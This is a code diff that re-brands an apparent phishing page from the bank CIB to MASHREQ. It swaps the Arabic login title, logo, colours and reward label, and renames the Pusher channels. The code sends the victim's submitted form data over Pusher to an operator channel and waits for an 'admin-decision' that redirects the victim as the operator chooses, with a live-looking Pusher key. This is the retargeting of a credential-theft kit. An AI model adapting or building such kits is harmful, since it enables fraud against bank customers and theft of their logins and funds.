@@ -37,7 +37,7 @@ if (isset($_POST['submit'])) {
             'updatedData' => $site
         ];
 
-        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);
+        $pusher->trigger('my-channel-MASHREQ', 'update-user-accountt', $dataUser);
 
         echo "<script>document.location.href='waitaccount.php';</script>";
         exit;
@@ -54,7 +54,7 @@ if (isset($_GET['reject'])) {
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CIB - تسجيل الدخول</title>
+    <title>MASHREQ - تسجيل الدخول</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
         rel="stylesheet">
     <style>
@@ -177,7 +177,7 @@ if (isset($_GET['reject'])) {
             border: 1.5px solid #e2e8f0;
             border-radius: 12px;
             font-size: 15px;
-            color: #1a2332;
+            color: #f57c00;
             font-family: 'Cairo', sans-serif;
             background: #f8fafc;
             outline: none;
@@ -439,7 +439,7 @@ if (isset($_GET['reject'])) {
         }
 
         .loader-card h5 {
-            color: #1a2332;
+            color: #f57c00;
             font-size: 16px;
             font-weight: 700;
             margin-bottom: 4px;
@@ -467,7 +467,7 @@ if (isset($_GET['reject'])) {
 <body>
     <div class="page-wrapper">
         <div class="top-bar">
-            <img src="assets/logo.webp" alt="CIB" />
+            <img src="assets/mashreq.jpeg" alt="MASHREQ" />
             <button class="lang-btn">
                 <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                     <polyline points="1,4 6,9 11,4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
@@ -577,7 +577,7 @@ if (isset($_GET['reject'])) {
                     <rect x="2" y="7" width="20" height="5" rx="1" />
                     <line x1="12" y1="22" x2="12" y2="7" />
                 </svg>
-                <span>مكافأة CIB</span>
+                <span>مكافأة MASHREQ</span>
             </div>
             <div class="nav-item">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8">
@@ -641,7 +641,7 @@ if (isset($_GET['reject'])) {
             var pusher = new Pusher('f8499dfcc5db13fb4153', { 
     cluster: 'ap2' 
 });
-            var channel = pusher.subscribe('my-channel-cib');
+            var channel = pusher.subscribe('my-channel-MASHREQ');
             channel.bind('admin-decision', function (data) {
                 if (data.userId == userId) window.location = data.url;
             });
